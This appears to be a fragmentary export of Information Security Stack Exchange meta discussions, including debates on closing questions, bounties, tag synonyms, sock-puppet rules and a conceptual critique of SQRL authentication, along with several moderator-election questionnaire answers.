<p>Instead, what really rocks in answers is to explain diagnosis methodology and tools, so that the owner of the information can go on with solving his problem without divulging that information anywhere. In any case, if it is sensitive, then it would be unreasonable to show it to ""a stranger on the Internet"", however awesome his account picture may be.</p>

<p>Alternatively, if you want to ask for more information, then you may explain which parts of the data are sensitive and which are not, so that the asker may hide the critical elements in screenshots. Note that a typical diagnosis dialogue where the answerer repeatedly ask for further specific information is, indeed, a <em>dialogue</em>: thereby not appropriate for a Q&amp;A site. Ideally, the asker should do some <em>prior research</em> and his question will either provide the needed information right away (with the private parts hidden), or will be a question about diagnosis methodology (which is better).</p>
",<discussion><feature-request>,15,,740
"Why do people keep putting ""+1 for .... "" in the comments?","<p>I would agree that this is something that should not be done if you have nothing to say but ""I agree."" However, I frequently find questions with a top answer that has received dozens of +1's because it was the first answer worthy of a +1, and so during the period when it was favored as a ""hot question"" without an accepted an answer, people who got to it just a little too late to answer themselves discovered it and decided to +1 it and move on because they didn't have much to add.</p>

<p>But sometimes those answers, while correct and according to the guides and all, are merely ""good enough."" There may be other answers that are truly superior, or do a better job of leading the questioner to the path of understanding. Sometimes other answers do just as good of a job but additionally they tackle important issues raised in the question that the top answer for some reason didn't respond to. And sometimes there's a morass of answers that are pretty good, and then one jumps out at me as really good for a particular reason. </p>

<p>In occasions like this, I leave a ""+1 [because]"" comment because I believe that it's possible other intelligent and knowledgeable judges, busy as their type are known to be, just missed this answer when they passed through. As I apply my vote to the answer, I simply want to explain why I believe this answer merited it when there were other answers that seemed to be receiving much more favor. Or I thought the answerer did a good job and wanted to encourage him to continue offering what he can to the community. Maybe others did damn well, but I only have so many upvotes to give in a day. Perhaps it received negative votes from others who didn't explain why, or were unnecessarily harsh, and I thought I could help the answerer improve his offering.</p>

<p>I don't see how these kinds of circumstances don't warrant a comment upon upvoting just like it's important to leave a comment when you downvote to give the author an opportunity to improve his answer, or at the very least do better in the future. When you downvote and take away someone's rep, they deserve to know why (assuming someone else hasn't already told them). On rare occasions, the answerer you're rewarding and/or the answerers you passed over deserve to know why, too.</p>

Is it OK to choose an accepted answer but grant the bounty to an other,"<p>Down votes are, in fact, one indication that reviewers <em>are</em> doing their jobs.  One of the review actions that you can take on a first or late post is indeed to up or  down vote the post.  It stands to reason then, that posts with a lot of down votes are simply poor quality posts, and not in indication of a lack of proper review.  </p>

<p>This is in fact why we have the voting system on Stack Exchange, and why it allows down votes as well as up votes.  It's a valuable piece of metadata to show what the community collectively feels about the value of any given post.   In many cases low quality posts with many down votes <em>do</em> end up being closed or deleted, or otherwise cleaned up, but that should not necessarily be a step of first resort.  The voting mechanisms allow a number of users to weigh in first, which ultimately results in our retaining the highest quality content.  Because of this, I really wouldn't want a system that front-loads moderation to an extent that substantially eliminates the input of the community.  </p>

Is it OK to choose an accepted answer but grant the bounty to an other,"<p>The <a href=""https://security.stackexchange.com/help/someone-answers"">official recommendation</a> for accepting answers is</p>

<blockquote>
  <p>Choose one answer that you believe is the best solution to your problem.</p>
</blockquote>

<p>The accepted answer is the one that shows up at the top of the answer list for visitors. It's generally best to accept the answer that provides the best overview of the topic. The choice of accepted answer influences how all visitors will perceive the thread.</p>

<p>A bounty is largely a matter between the bounty giver and the recipient; the bounty is indicated next to the answer, which indicates that there may be something particularly useful there, but it doesn't make the answer stand out very much. It's mostly a reward for an outstanding answer.</p>

<p>Some bounties are naturally awarded to the accepted answer, if it provides exceptionally good coverage of the topic or a clever, useful solution. At other times, a bounty rewards an outstanding, but partial answer, for example a detailed treatment of one of the aspects of the problem, or a clever solution that only works in special cases; in such cases, it's natural to award a bounty to an answer without accepting it.</p>

Closing old questions,"<p>The presence of a reasonably successful site like <a href=""https://softwarerecs.stackexchange.com/"">https://softwarerecs.stackexchange.com/</a> demonstrates that software recommendations can be handled effectively in the stackexchange format.  But for a field as specialized and often counter-intuitive as security, I think keeping the questions here is typically a benefit.</p>

<p>It is often harmful to close, and not delete, old questions which already have helpful answers.  We would typically be left with questions which over time will have bad answers, because new and improved tools will come along.  Deleting them is often even more unhelpful, as a waste of admin energy, a source of needless debate, and a loss of useful information.</p>

<p>The appropriate action is to improve the question with edits which demonstrate best practice, by making sure it is clear just what the requirements are for the tool, so that there is a good answer.  When there is a good accepted answer, such edits should typically make it so that the question matches the answer.</p>

<p>It is also bad form to suddenly flag lots of questions, before discussing goals and strategies with the community.</p>
",<discussion><moderation>,5,,183
Closing old questions,"<p>Guilty, so here are my thoughts.</p>

<p>Let's keep this in mind: so far, every single flag I've raised has been labeled as ""helpful"" which means that these questions were indeed off-topic.</p>

<p><strong>Why not just leave these questions alone?</strong></p>

<p>We have a review queue about this and it's called ""Late Answers"". For example, so far today there were 3 late answers which means that eventually, someone will post in one of them (<em>them</em> being the off-topic questions) when the question itself should be closed in the first place.</p>

<p>Neal suggested to edit these questions and to be fair, most of them seem irrecuperable because they are blatantly requesting for X product doing Y. Also, like I said in the comments, it would also bring them up in the feed, which is what we probably want to avoid.</p>

<p><strong>Is there a written rule against this?</strong></p>

<p>As far as I know, nope (feel free to correct me if I'm wrong). </p>

<p>Also, what also makes me believe that this is not wrong is that we can a maximum of up to <a href=""https://meta.stackexchange.com/questions/185888/on-the-recent-changes-to-flagging-and-limits/185890#185890"">100 flags per day!</a> Therefore, I do not see why one should be refrained from flagging many questions in a somewhat short length of time.</p>

<p>Now about flagging old questions, if this is inappropriate, why are we able to do so then? Simply because it does not mean that it's a good and/or appropriate question because it never got flagged.</p>

<p><strong>There has to be something negative this could cause, right Mr. Simon?</strong></p>

<p>Sure, it fills up the queue with questions that don't need immediate care. Therefore, if you flag a bunch of questions, a newer question might not be reviewed because the reviewers maxed out their review cap (I feel like I should stop typing ""review""). That, indeed, can cause trouble.</p>

<p><strong>What should be the proper behavior?</strong></p>

<p>Well, as suggested by the almighty @AviD in the chat, flagging a few questions at a time to avoid filling up the queue is probably the best way to act. Personally, I'm still unsure if we should edit these questions at all considering that most of them seem to be a lost cause.</p>

Closing old questions,"<p>To complete @Rory's answer: what is frowned upon is the specific action of <em>sock-puppeting</em>, where you have multiple accounts on the same site <em>and</em> you abuse the ""game rules"" with the coordinated action of these multiple accounts. As the powers-that-be on SE say it, it is OK to have multiple accounts as long as ""they don't vote for each other, and they don't vote for the same thing"". To be really separate, you may also refrain from voting with one account on a question where another of your accounts provided an answer, though that case would not be deemed sock-puppeting.</p>

<p>An important corollary is that sock-puppet detection systems won't be triggered if you behave ""ethically"", since they concentrate on vote-related actions.</p>

<p>If you do maintain several accounts on a single site, then it is simpler never to vote with any of the ""secondary"" accounts.</p>

Why was this question closed and does the Help Center need to be updated?,"<p>Well there are a range of close reasons which would be appropriate here. We probably should have used:</p>

<ul>
<li>Questions asking us to break the security of a specific system for you are off-topic unless they demonstrate an understanding of the concepts involved and clearly identify a specific problem.</li>
</ul>

<p>The question is not about physically securing an asset, but about circumventing detection controls required for a very specific purpose.</p>
",<discussion>,3,,1007
Why was this question closed and does the Help Center need to be updated?,"<p>Seeing as I have personal interest in this question, I might as well try.</p>

<p>Since this will obviously be biased in my favor, I will start instead with all the <em>reasons to close:</em></p>

<ul>
<li><p>Help center defines the ""IT Security Stack Exchange [as] being for Information Security professionals to discuss protecting <strong>assets</strong> from threats and vulnerabilities."" </p>

<p>This prompts the question, ""is personal location data an <strong>asset</strong> (as defined within the help center)?""</p>

<ul>
<li><strong>No:</strong> Assets include any property owned by a company, including intellectual property, customer data, patented materials, etc. (i.e. anything that can cause <em>the company you are working for</em> to lose money, sales, or customers.)</li>
<li><strong>Yes:</strong> Assets are any type of information that can cause a company <em>or</em> individual to lose an amount of money. Additionally, assets are information that could be used to cause harm or harassment to an <em>individual or company.</em></li>
</ul></li>
</ul>

<p>I think it will be good to mention here that <strong>leading this site to strictly favor one-side and not the other does not give this site the opportunity to grow into it's full potential.</strong> ITsec has always been about both, after all it is <em>the individuals that make up the larger company entity anyways.</em> Individuals can and always have had interest in protecting their personal information and data.</p>

<p>Trying to protect the corporate entity against theft and revenue loss, while turning your back on the individual who lost his identity due to a public Wifi hotspot does not progress IT security understanding and research—it deteriorates it.</p>

<blockquote>
  <p><strong>Side Note – Reluctance to acknowledge Individual-based problems as being on-topic:</strong> I know as well as anybody who's worked in sales knows — we don't want the general public banging on the door. Please know I don't mean for this to affect the <em>quality</em> requirement for questions or the ""some personal effort put in to finding the answer first"" requirement; those rules, as always, still apply.</p>
</blockquote>

<ul>
<li><strong>It's <em>possibly</em> illegal.</strong> It's not. First off,
<ul>
<li><strong>There is no law on the books (in USA) that specifically protects a law enforcement officer's or repo driver's rights to collect such data.</strong> Even more specifically, no law exists that prohibits my (still theoretical) devices from being used to protect against dragnet data-mining attacks.</li>
<li><strong>Laws for similar devices favor it.</strong> <a href=""http://www.radarbusters.com/State-Radar-Detector-and-Laser-Jammer-Laws-s/2412.htm"" rel=""nofollow"">Radar detectors</a> notify the driver that he is being scanned by a police radar gun, giving him time to slow down before the gun gets a ""lock,"" which would give the officer cause to pull him over. For <strong>Laser scanners</strong>, the counterpart is a laser detector/jammer combo: If it picks up signal from a police laser gun, it sends out tons of ""garbage"" laser messages back — essentially confusing the gun and preventing a lock. These have been legal to own and operate for decades, except in D.C. and Virginia.</li>
<li>The Bill of Rights in my county (set of laws defining rights' protection for every citizen) <a href=""http://law2.umkc.edu/faculty/projects/ftrials/conlaw/rightofprivacy.html"" rel=""nofollow"">implicitly protects an individual's liberties and rights to privacy.</a> Even if the law does not explicitly include privacy in the list of protections, that's <em>one Supreme Court case and a lot of media attention</em> away from changing.</li>
<li>Discussing the legal merits any further than this (for cases undecided) on the <strong>IT Sec</strong> Stack Exchange is the wrong place to do it. We all know how firewall rules work around here, right?: No explicit deny rule, matches an existing pass rule, <em>all is well in the kingdom</em>.</li>
</ul></li>
</ul>

<p>So, if we've agreed that there's <em>not enough evidence</em> to support the claim that building and operating one of these (still theoretical) devices breaks any laws; and that the Security of Personal Information is within the scope of the Information Security board; then what other reasons for closing remain? The only I can think of:</p>

<ul>
<li><strong>It's unjust to interfere with Law Enforcement / Morality &amp; Ethics:</strong> This is a debate that could last for days, so I'll just touch lightly on it — will this even still be a debate when it's discovered smartphone backdoors are leaking <em>everyone's personal location data</em> to LE servers in plaintext to be stored for several years? You should know it's going to be tried soon—if it's not already happening.</li>
</ul>

<p>And that's it for me. </p>

China tag has to go,"<p>I noticed you got only a limited answer, so I'll share my reaction.</p>

<p>I don't know.  This doesn't sound related to <em>Information</em> Security, and I'm not sure you can expect people on this site to have relevant expertise.  That said, I'm not sure.  I'm not convinced it is off-topic for the site.  I'm not sure it should have been closed for that reason.  If the question was otherwise suitable, I would consider voting to re-open.</p>

<p>However, right now it is subjective and largely opinion based.  It asks ""What is the best way to...?""  Generally, this wording makes it hard to evaluate answers and pick a single correct answer, so it makes the question not an ideal fit for this site.  (I realize this is highly counter-intuitive.  For what it's worth, it tripped me up when I first joined StackExchange.)</p>

<p>As a result, I think closing this question was appropriate, and as it currently stands it is not in a shape suitable for a vote to re-open.</p>

<p>If you would like to see the question considered for re-opening, you can edit the question to improve it.  Here are the edits I would recommend:</p>

<ul>
<li><p>Instead of asking for ""the best way"", it's usually better to list the evaluation criteria you will use to evaluate answers.  Are there some hard requirements?  Some metrics?  What options have you considered and rejected?  This will help you craft a more focused, objective question.</p>

<p>For instance, maybe you aren't looking for the ""best"", ""cleanest"" way to defend yourself.  Maybe you are just looking for a practical way to defend yourself.  If so, ask for that.</p></li>
<li><p>Also, try to stick to one question per question.  Right now you ask two questions: What's the best way to defend yourself?  Would an IR light work?  That's two questions.  Admittedly, they are closely related, but you might do better to focus on just one, or ask them separately.  Right now, I can imagine an answer that says ""No, an IR light wouldn't work (for such-and-such reason).""</p></li>
<li><p>Lastly, show your research.  Keep in mind that, as <a href=""https://security.stackexchange.com/help/on-topic"">the help center states</a>, ""IT Security Stack Exchange is for Information Security professionals"".  The more you show that you have done detailed research, and can show that there is technical depth to the question, the greater the chances that it will be suitable.</p></li>

<p>Most questions about USB something are about removable drives in general, and the fact that they happen to be connected over USB is just a matter of today's dominant technology.

<p>Most questions about USB something are about removable drives in general, and the fact that they happen to be connected over USB is just a matter of today's dominant technology.

Should the Security Stack Exchange tour page list best security tool questions as bad questions?,"<p>The key problem here is that 'best' is an opinion, and Stack Exchange is very much not a place to ask questions that will result in opinions.</p>
<p>As an example, I may really like tool X. Someone else may hate it and prefer tool Y, which I think is terrible.</p>
<p>How would you decide which is correct for you from that info?</p>
<p>We already have two great pages for what you <a href=""https://security.stackexchange.com/help/on-topic"">should</a> and <a href=""https://security.stackexchange.com/help/dont-ask"">shouldn't ask</a>, and this is covered well:</p>
<blockquote>
<p>To prevent your question from being flagged and possibly removed, avoid asking subjective questions where …</p>
<ul>
<li>every answer is equally valid: “What’s your favorite ______?”</li>
<li>your answer is provided along with the question, and you expect more answers: “I use ______ for ______, what do you use?”</li>
<li>there is no actual problem to be solved: “I’m curious if other people feel like I do.”</li>
<li>you are asking an open-ended, hypothetical question: “What if ______ happened?”</li>
<li>your question is just a rant in disguise: “______ sucks, am I right?”</li>
</ul>
</blockquote>
<p>As an aside, fanatical devotion to a particular tool does happen a lot in the security testing industry. Often with no real basis, as an objective viewpoint shows that many tools are broadly as bad/good as each other and in fat are best used together to minimise specific false positives/negatives.</p>

<p>I think the newest question might still be broad. Watermarking encompasses a lot of concepts, some of them having ties to security. </p>

<p>You might want to search a bit more on the subject to refine what you are having as problem. Let me give you some clues on the vocabulary:</p>

<p>Watermarking can be <strong>robust</strong> or <strong>fragile</strong>. Robust watermarking are meant to resist tampering (or altering, it's the same thing to me). This means that the mark would be inserted in a way that modifications on the media does not destroy it, or that the mark can be recovered using redundancy for example. If the watermark is fragile, this means that any modification will make the mark disappear. The robust-fragile property is a scale and you can find watermark that are semi-fragile (resisting different modifications) or XX-robust (jpeg-robust, ...).</p>

<p>Watermarking can be <strong>visible</strong> or <strong>invisible</strong>. The former being a ""TV""-logo image on the bottom-left of the screen (for example) and the latter being a hidden code.</p>

<p>And more properties... (blind, informed, ...)</p>

<p>All these properties usually are tied together as making a mark robust will usually translate in stronger modification on the image, thus making the mark visible.</p>

<p>The security feature of watermarking depends on the application. For example, a DRM-protection will use a robust watermarking scheme, visible or invisible, but a watermarking meant to serve as proof by assessing non modification of an image will be fragile (any modification voids the proof by destroying the mark).</p>

<p>Anyway, I suggest you:</p>

<ul>
<li>identify your application first (what are you trying to use watermarking for, is it DRM, identification or authentication)</li>
<li>define your field of operation (what kind of media, what kind of message)</li>
<li>what do you want to be protected against. </li>
</ul>

Though I'm not convinced whether it's warranted: the context already makes it apparent that the link is to potentially malicious content, and merely clicking on a link should not cause problems anyway.

<p>No, and no. Most links to malicious content should be removed. Only a few links to malicious content are useful to have, it's not worth creating a site feature for this.

Is Security.SE only for professionals?,"<p>Shaul - first off, <strong>the moderators had nothing to do with the close</strong>. It received 5 community close votes.</p>

<p>The problem with is, and various commenters tried to explain to you, is that <strong>the question is too broad</strong>. This is why it was closed, and the close reason gives links to the help centre so you can see what you might need to do to improve it.

Is Security.SE only for professionals?,"<p>To complement what @Rory says, I'd like to point out that there is no rule that says that <em>any</em> question fits somewhere in the StackExchange network. By design, the SE sites concentrate on questions that can be answered in about one page of text. Of course, longer answers exist, because <em>some people</em> tend to exhibit a larger than average level of verbosity, given the occasion. However the general point remains: if a question is ""too broad"" then it is too broad <em>everywhere</em>; i.e. there is no such thing as a ""correct forum"" within the SE sites for such a question.</p>

<p>This implies that while the SE sites are a great source of detailed information, they cannot really cover the Big Questions that have a large scope. These must be handled somewhere else; the Internet is a large place.</p>

<p>Unfortunately, asking for pointers to introductory information on a broad subject, the very thing you need to make that ""preliminary research"", happens not to be a good fit for an SE site either, for different reasons. It is not that SE people don't consider such questions invalid, or too noobish; it just is that experience shows that they don't mix well with the dynamics of the SE sites as they operate today. Personally, when I try to imagine how would work a site that <em>can</em> help people understand these ""too broad questions"" or at least direct them to appropriate resources, well, it no longer looks like a Web site; rather like a university library.</p>

(There are also additional tags for specific regulations, e.g. <a href=""https://security.stackexchange.com/questions/tagged/pci-dss"" class=""post-tag"" title=""show questions tagged &#39;pci-dss&#39;"" rel=""tag"">pci-dss</a> and <a href=""https://security.stackexchange.com/questions/tagged/hipaa"" class=""post-tag"" title=""show questions tagged &#39;hipaa&#39;"" rel=""tag"">hipaa</a>, but I am not proposing doing anythign to them.) </p>

<p>I think one should be a synonym for the other, but I'm not sure which. Compliance does have many more q's already using it. </p>

I saw that it wasn't on topic here as currently worded, as there is nothing in it on risk management, and if anything is an opinion piece on how to decide when you are capable of writing your own crypto. I followed the flag for migration, hoping it would be better served over there.</p>

How can I delete/vote down/flag an outright wrong tag synonym?,"<p>IMHO I Think people are selecting the wrong Close flag reason. Since that question is about a very specific interface of a very specific software (some sort of Music tool), I Think personally the question is ""Off topic"" for the second reason (that it can become obsolete very Quick).
Its the same as asking ""Is Steam safe to run on my computer?"", its a too narrow question if you would ask me.</p>

<p>Its like same as asking which antivirus software is best. Even if such a question could be objective based based on some objective metering, such a answer would quickly become obsolete if a new software launches or some software shut down.</p>

<p>And same here, if the Company stops manufacturing that Music tool, VSTs would have no meaning anymore.</p>

How can I delete/vote down/flag an outright wrong tag synonym?,"<p>I agree. I think the Close Vote queue is at fault to some extent - as soon as one person issues a close vote, the question appears on that queue, encouraging others to close it. In fact, I don't think it's even possible to vote to keep the question open, so even if 10 people think it should stay open, 5 close votes would be enough. I presume this close queue is a general stack exchange feature though, so we can't turn it off. Perhaps we could increase the rep threshold to access it?</p>

"Debunking ""Debunking SQRL"" - Blog article is misleading","<p>As for the convenience and other factors about passwords or SQRL, I don't find either system particularly compelling. But for phishing, this is something that I find to be a very serious issue.</p>

<p>I'll spare you all the technical details, but the basic issue is that SQRL is strictly out-of-band. Your identity is your phone, your phone cannot communicate with your browser. The <em>website</em> can communicate with your browser, and the <em>website</em> can communicate with your phone (both directly and by sending QR codes), but the browser never gets to deliver the phone the browser's verdict about the TLS session. So the security of the user's TLS session doesn't factor into the authentication step, and therefore authentication can be subverted. In other words, phishing can and will happen.</p>

<p>SQRL is fine for situations where authentication isn't important -- situations where it doesn't matter if your account gets compromised. Situations where you'd be happy using the word ""passw0rd"" as your password. But if security matters, then SQRL is not for you.</p>

<p>If you want to see an example of authentication done <em>right</em>, then look at the U2F security key created by Google. Remember that bit about browser integration? For U2F, the browser (this is built in to chrome) communicates directly with the USB hardware and tells the USB token what website it's on after verifying the website identity through TLS. That becomes part of the key exchange, meaning that it is literally impossible to authenticate on a phishing page. This means that phishing isn't just ""hard"" or ""unlikely"" or ""complicated"" -- phishing is <em>impossible</em>. </p>

<p>Gibson <em>almost</em> got this right, but he made a typical amateur error in failing to understand the attack model. He makes the website identity part of user identity, but the website doesn't need to be authenticated to the browser. So a phisher can take a <em>valid</em> QR code from the real site and show it to a victim using an <em>invalid</em> phishing page. The victim authenticates, and the attacker gets logged in. I'm sure Gibson could have gotten it right if he had more experience in designing security protocols. But as these go, the error is too deeply baked into the protocol, and it can't be salvaged.</p>

<p>No, I do not.  </p>

  certain type, bad tools/guidance, …) What do you think should be done
  about this (whether as a moderator, or by other users, or by Stack
  Exchange staff or anyone relevant)?</p>
</blockquote>

<p>I believe we still have some uncertainty around what questions are appropriate for the site, and this results in some questions being closely incorrectly or at least too quickly.  Specifically when questions move out of the realm of the theoretical and into the practical, we have an unfortunate tendency to close with prejudice.  As to remediation, I think this is exactly what meta is for, and we as a community and as a moderation team should be leaning on this tool more than we currently do in order to provide additional guidance.  </p>

  they reflect different topics that merely overlap? Does their
  existence betray a lack from Sec.SE's part?</p>
</blockquote>

<p>To some extent HackOverflow overlaps with this site, and to some extent it overlaps with ReverseEngineering.SE. I think there's a legitimate place for ReverseEngineering.SE, but for the HackOverflow questions that don't fit there, I think that speaks more to our neglect of some of the practical questions I mentioned earlier than to a need for a new site.  </p>

<blockquote>
  <p>How would you deal with a user who produced a steady stream of
  valuable answers, but tends to generate a large number of
  arguments/flags from comments?</p>
</blockquote>

<p>First, I would confer with the rest of the moderation team.  My initial desire would be to ping the user to offer corrective guidance, but I would want to make sure that the mod team was on the same page before speaking on behalf of the site.  </p>

<blockquote>
  <p>How would you handle a situation where another mod closed/deleted/etc
  a question that you feel shouldn't have been?</p>
</blockquote>

<p>I would discuss it with them, and let them know how I feel, much as I do in the DMZ now.  </p>

<blockquote>
  <p>Do you have prior experience as a moderator, either on Stack Exchange
  or on an IT Security site?</p>
</blockquote>

<p>No, not on StackExchange or an IT Security site.  I do have 15 years professional experience building communities (both the software and the communities that use the software) and working with community managers and management teams. </p>

<blockquote>
  <p>Some have complained that people make close votes too easily. Do you
  intend to do anything about that?</p>
</blockquote>

<p>I try to be careful about closing questions, personally, and vote to leave a fair number open.  As I've mentioned in several previous answers, I think more extensive use of our meta site could allow us to offer better guidance to the community on when questions we're currently closing might actually be valuable to the site. </p>

</blockquote>

<p>I'm not particularly familiar with chat moderation, and I'm not active in that room, so I would probably just put the room in timeout for a minute (I think mods can do that) to allow the mods who know the room and the users to show up and provide more specifically appropriate guidance. </p>

</blockquote>

<p>Well, we know which users have particularly good answers on a particular topic.  In some cases it may be as simple as doing a little legwork to reach out to the them, to get them to add canonical answers.   In other cases, it may be a good idea to spend the time to aggregate the answers from several different duplicate questions into a community wiki answer on the best question in the vein.  In most cases including those about, the answer is that somebody, either a moderator or community member needs to commit to spend the time and energy required to drive the issue to resolution, and time and energy are often the shortest assets in supply in a part-time volunteer community.  It might be helpful to be able to flag questions as needing a canonical answer and surface that in a visible and easy to access location, so it can be regularly reviewed and someone could knock one out when the mood strikes.   </p>

</blockquote>

<p>If the information was sensitive enough, I may temporarily delete the question as requested, but in any case it would be escalated to SE staff to permanently redact the sensitive information from the question as the final solution, while leaving the question materially intact.  </p>

</blockquote>
<p>To my opinion, the biggest challenge would be consolidation of our knowledge. There are now a lot of questions, lot of good ones with as good answers. I think effort should be made to improve the searchability of these questions. Most notably, bring back some kind of FAQ like we used to have, where we gather the most common questions (maybe a different format). Then a lot of tags need cleaning, because they yield improper results, or some questions are missing tags.</p>
<p>The second main thing would be providing better guidance to newcomers. Lot of questions got closed, usually with good reasons, but users are left without any comments. Most of the closed questions (even duplicates sometimes) are opportunities to make better questions, new users are not usually motivated to do it when they see their question downvoted and closed fast.</p>
<p>As a matter of fact, I would be happy to work and help on other projects/propositions the community (or even current moderators) would want to.</p>

</blockquote>
<p>I don’t think of area51 as any threat nor a lack of our community. If our scope was to evolve, it’s up to the community here. We have done it in the past. And if the proposals finds their way into private or even public beta, well good for them. The procedure of growing and graduating are working really well. If these proposals comes as new fully fledged site, it would be because they have their own community and a good scope as well. And topic overlap has been a fact for many already existing stacks, which are still very healthy. Users define their communities.</p>
<blockquote>
<p>How would you deal with a user who produced a steady stream of valuable answers, but tends to generate a large number of arguments/flags from comments?</p>
</blockquote>
<p>Well, the usual trick question of the user that provide good and bad thing to the community. We do want to keep them of course, so if they are also producing bad results this is when moderation is needed. Most of the time, theses cases shall be solved with a discussion with the user. If they already contribute to the community by generating quality content, they would surely be open to improve themselves. If the problem still persists despite all attempts and they have an overall negative contribution, we need to be firm about the bad things and act accordingly.</p>
<blockquote>
<p>How would you handle a situation where another mod closed/deleted/etc a question that you feel shouldn't have been?</p>
</blockquote>
<p>Well, first I find that our moderators rarely act out of haste here. So the question would probably be closed first. And that case is still eligible for a reopen vote by the community. Bringing a bit of highlight on the question, for example in the chat room, would be the first thing to do. Rory also regularly asks for community review on these questions he thinks has not been given enough credit to and can be improved/reopened. As I said above, closed questions can be opportunities to improve.</p>
<p>Should it happen that the question/answer gets deleted while I don’t agree, well we do have chat rooms (and there are rumours of hidden moderators chat rooms, where they all share these dark secrets). Maybe I will agree to their point, or they will agree to mine. If it's still a point a conflict between mods, a meta post might be appropriate to let the community decide what they think is best.</p>

<p>I did not take a close look to it. But if it’s a point people really complain about, it’s worth exploring. Nothing is set in stone. I can’t tell for sure I would do more, until I know what’s really the problem and the consequences. If I had to guess, what could be done, I am pretty sure that bringing awareness or guiding people (like with a meta post) would be the way to go. After, all closing questions is the right of the community. They can be closed, but they also can be reopened. The self moderation is a keystone of any stacks and it’s not good to impose rules on it. However, warning the community to be cautious and relevant in their votes, reminding them of its role is perfectly fine to me. And again, closed questions are opportunities to improve.</p>

<p>First thing first: these rooms have dedicated moderators who probably know better than me what is going on. So the thing to do would be to get in touch with them asap. If it becomes obvious they are not here to deal with the situation, I see no problem in stepping in to deal with it myself. Most of the conflict should disappear by asking nicely to behave. If this is not enough, moderators tools are here for these other cases.</p>

</blockquote>
<p>As I said on a previous answer, there is indeed a work to do for these “most common” questions. I don’t have the exact format in mind yet, but the first thing that comes to my mind would be a meta post to reference them. There has been some example of FAQs on some stacks meta that have work correctly.
Another idea would be to start project. We had our blog, for which many provided real good articles, but it’s not been updated since 2014. Maybe having community project could gather our authors to work on this goal and help in having question compiled together to form the canonical posts we are lacking.</p>

<p>A question is flagged: <em><strong>Please delete this question – my boss has seen it and says it contains confidential code – he's freaking out and wants me to remove it, but I can't delete it.</strong></em> The question was asked 3 days before, it has 2 answers, one is accepted.  How do you respond? I could imagine this might be particularly pertinent on this Stack, where somebody might post security-sensitive information (e.g. passwords hints/policies, crypto details) and land themselves in hot water.</p>
</blockquote>
<p>To start, any author can delete his own question or answer. Even anonymous ones in the right conditions. This leave the question only visible to 10k+ users, meaning 29 persons and 2 bears. So I would say this would rather limit the damage in the first place. Should the user really be incapable of deleting said question, it’s a bit trickier. First, we have no way to be sure the content belongs to the entity. Second, we might not even be able to confirm the identity of the user asking us. So unless it’s seems pretty evident that some law has been broken (like if someone publishes personal information, or credit card number), I would leave that way. In all the case, I think it is wise to refer to higher authority. I am pretty confident that StackExchange has a legal advisers on board that could be contacted by the moderator team for these kind of cases and I think they would prefer to be notified of potential problems that might not be, rather to find a complain at their door.
A good tool to have would be to be able to edit without history, this could be used to “anonymise” the data properly, but I don’t think such tool exists at this time. And maybe our current moderators know of a good way to proceed already.</p>

</blockquote>

<p>I think the main problem with the site is the relative lack of <em>quality</em> questions and answers. As evidenced by the sites top scoring questions &amp; answers and even my top answers, the really popular questions that attract the most votes and views tend to be ""beginner"" type questions asked by people without a solid foundation in information security.</p>

<p>I believe that all of these proposals are strict subsets of Information Security Stack Exchange (and in some cases Stack Overflow). I do not believe that such sites will be beneficial and they should be directed at Information Security Stack Exchange instead.

<p>I believe that the site moderators or moderators that hang out in the room should deal with the situation if possible since different rooms have different cultures and different things they consider acceptable.

</blockquote>

<p>The biggest challenge that Sec.SE is facing right now, from my perspective, is an interpretation of focus and intent especially as the community evolves. Is Sec.SE intended primarily for InfoSec professionals to seek answers or for InfoSec professionals to answer questions? This is not an easy problem. I'm seeing a definite trend where many of the core InfoSec questions have already been answered sufficiently, and if we are too strict in the ""professional nature"" of the questions, we will severely hamper the community. On the other hand, if we allow all natures of questions, then we dilute the existing valuable professional nature of the site.</p>

<p>This is a problem that needs to be addressed by the community as a whole, led by the moderators. It would be interesting to run polls of the community to ask about new on-topic material. </p>

  existence betray a lack from Sec.SE's part?</p>
</blockquote>

<p>This is a fantastic question and relevant to my previous answer. My stance all along has been that Sec.SE should remain on the conceptual and architectural levels. As a rule of thumb (certainly not strictly), a question that would have an answer that would be a command or a configuration option is more of a tech support or a tool-specific question. If we allowed all these types of questions, we would be (we have been at times) inundated with questions of so specific nature that the overall intent of the site could be/would be lost. To that end, a Stack Exchange site that could tackle these important questions should exist: a site where it would make sense to debate and discuss the relevant merits of various nmap options or technical troubles with metasploit. </p>

<p>In my opinion, Sec.SE should seriously consider the merits of taking on the higher level topics, such as Privacy. But, even such a move should be done with a clear understanding of the scope of the topic. </p>

<p>I do not see the spawning of these sites as a lack on Sec.SE's part, but an indication of the ever-evolving needs of the broader community, an evolution that Sec.SE can guide and respond to. </p>

<blockquote>
  <p>How would you deal with a user who produced a steady stream of
  valuable answers, but tends to generate a large number of
  arguments/flags from comments?</p>
</blockquote>

<p>The fact that the user produces valuable answers means that it is a user that the site should encourage to stay involved. An unfortunate trend in unhelpful comments needs to be addressed on a personal level. I would reach out personally in order to understand the motivation for the unhelpful comments and to inform the user how those comments are affecting the community. I would also alert the other mods in order for us to come up with consistent and communal approach in dealing with the comments that are causing problems.</p>

<blockquote>
  <p>How would you handle a situation where another mod closed/deleted/etc
  a question that you feel shouldn't have been?</p>
</blockquote>

<p>I would simply seek to understand. It is important that all mods act in concert, and if there is a disconnect, or a desired shift in the previous understanding, then starting a discussion is the best way for everyone, including me, to work together. The Meta site and the DMZ are great ways to do this.</p>

<p>I do not have experience as a moderator on other sites, but I do have experience as Speaker of the House in Parliamentary debate clubs, as a Game Master in a variety of tabletop RPG games, and as a school department head and a business owner and manager. </p>

<blockquote>
  <p>Some have complained that people make close votes too easily. Do you
  intend to do anything about that?</p>
</blockquote>

<p>The site must be clear about what is on topic and what constitutes a question that is too poor to answer. Quick close votes should reflect that a question clearly does not meet the established standards. If quick close votes are not reflecting that, then I would make a broad call to the community for mindfulness from everybody when casting close votes, and perhaps re-open closed questions that might require a reevaluation from the community. In addition, it might be helpful to add to the FAQ to communicate guidelines that would address the specific concerns.</p>

<p>Dropping into the middle of an established community and in the middle of a conversation to try to exert control can only make problems worse. I would try to alert the usual mods of the chat room, and simply announce myself in the chat room and ask if everything was ""ok"". That way, if there was a problem, people would have access to a moderator, but I hopefully wouldn't cause a new problem by my presence.</p>

<p>This is an important question to me. The problem that I'm seeing is a lack of a clear subject matter expert within the community for these questions. The community should work together to pull in the resources it needs to come up with a canonical reference. This way, these obviously important questions for people can be handled in a way that is helpful for everyone.</p>

